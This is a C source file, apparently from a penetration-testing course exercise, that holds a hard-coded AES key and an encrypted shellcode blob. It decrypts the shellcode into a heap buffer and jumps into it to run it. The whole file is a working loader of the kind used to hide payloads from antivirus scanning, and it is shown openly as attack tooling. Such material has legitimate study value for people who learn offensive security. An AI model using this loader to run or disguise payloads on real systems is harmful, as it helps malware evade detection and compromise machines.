/*
  
  Custom AES Shellcode Decrypter/Execut0r (Linux x86/32 Bits)
  (c) 2017 dabooze / Dilsec
 
  http://dilsec.com
  @dab00ze
 
  Licensed under CC 3.0 (http://creativecommons.org/licenses/by-sa/3.0/)
 
  This little program uses the a given 128 bit AES key to decrypt the
  (also given) encrypted shellcode. After decryption is done, code gets
  executed without further notice :-)

  Please note: This awesome (and tiny!) AES implementation had been taken
  from the following URL: https://github.com/kokke/tiny-AES128-C

  Initially wanted to write something more fancy that takes parameters from 
  STDIN, but ran out of time (CTP/OSCE course is waiting :-)).

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#define CBC 1

#include "aes.h"

// put in here the AES key as generated by the Crypter
unsigned char aes_key[] = 
	"\x69\x16\xcb\x1e\xcb\x39\xe4\xba\xa7\x09\xa6\xf2\x76\x4e\xa3\x37";

// and here comes the encrypted shellcode, should have a multiple of 16 bytes size
unsigned char encrypted_shellcode[] = \
	"\x36\x86\x5c\x41\x4b\x2c\x30\x22\x79\x12\x63\x50\xe9\xab\xa4\xef"
	"\x10\x7e\xf1\x14\xc4\x0e\xa2\x77\xe3\xb3\x16\x65\xb6\xbd\x64\x93"
	"\x19\xbd\x3e\x3e\x19\xab\x36\x85\x7e\x56\xb9\xc5\x63\x79\x52\xbd";

int main(int argc, char **argv)
{
	// Initalization vector
	uint8_t iv[] = { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f };

	// allocate destination buffer -> here we'll decrypt the shellcode into
	unsigned char * dst_buffer = malloc(strlen(encrypted_shellcode));

	int (*ret)() = (int(*)())dst_buffer;

	printf("[*] Decrypting AES Shellcode (beep-bleep-blop) ...\n\n");

	for (int offset=0; offset < strlen(encrypted_shellcode);offset+=16)
	{
		if (offset == 0)
			// first round requires passing key and IV
			AES128_CBC_decrypt_buffer(dst_buffer+offset, encrypted_shellcode+offset, 16, aes_key, iv);
		else
			AES128_CBC_decrypt_buffer(dst_buffer+offset, encrypted_shellcode+offset, 16, 0, 0);
	}

	printf("[*] Done. Now jumping into the code. Good luck!\n\n");

	ret();

	// fr33 buff0rz
	free(dst_buffer);

	// back home
	return 1;
}
